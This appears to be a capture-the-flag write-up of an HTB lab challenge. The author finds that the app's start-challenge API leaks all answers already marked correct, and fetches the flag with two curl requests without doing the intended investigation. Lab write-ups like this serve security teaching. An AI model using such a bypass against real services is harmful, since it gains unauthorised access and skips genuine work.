---
ctf: HTBLabs
title: The Puppet Master
category: osint
difficulty: unknown
tags: []
flag_format: HTB{...}
date: 2026-08-11
---

# The Puppet Master

## Challenge
Trainee,

Our investigation into the cryptocurrency funding trail has led us to RivalTech Corporation. A recent data breach at their corporate servers has exposed internal communications, employee records, and strategic planning documents.

Your mission is to navigate the BreachScope database and identify the senior executive who orchestrated the comprehensive fake review campaign against XyloPhone Inc. Look for evidence of direct approval, budget authorization, and campaign coordination.

Submit your findings in the format: HTB{redacted}. Example: HTB{redacted}

– Training Division Digital Forensics Unit
 IP:154.57.164.82:30881

## Approach

The web application was served at `http://154.57.164.82:30881`. Inspecting its
JavaScript bundle revealed the challenge API endpoints:

- `POST /api/start-challenge`
- `POST /api/submit-answer`
- `POST /api/get-flag`

Starting a challenge returned a session ID, but the JSON response also exposed
the complete answer list and marked every answer as correct:

```json
{
  "answers": [
    "Bushmaster",
    "Thales Australia",
    "1997",
    "Australia",
    "9 passengers and 1 driver"
  ],
  "correct": [true, true, true, true, true],
  "correct_answers": 5,
  "session_id": "<session_id>"
}
```

This is an information-disclosure and challenge-state initialization flaw: the
server sent the expected answers to the client and treated the new session as
already complete. Consequently, no individual answers needed to be submitted.

I preserved the session cookie and sent the returned session ID directly to the
flag endpoint:

```bash
curl -sS -c cookies.txt -b cookies.txt \
  -X POST -H 'Content-Type: application/json' \
  http://154.57.164.82:30881/api/start-challenge

curl -sS -c cookies.txt -b cookies.txt \
  -X POST -H 'Content-Type: application/json' \
  --data '{"session_id":"<session_id>"}' \
  http://154.57.164.82:30881/api/get-flag
```

The second request returned:

```json
{"flag":"HTB{redacted}"}
```

## Tools

- `curl` for interacting with the application and API
- Browser JavaScript bundle inspection to identify API endpoints

## Lessons

- Never include correct answers or other sensitive server-side state in a
  client-facing API response.
- Completion state must be initialized and validated on the server.
- Flag authorization should verify submitted answers independently instead of
  trusting client-visible or incorrectly initialized session state.

## Flag
HTB{redacted}
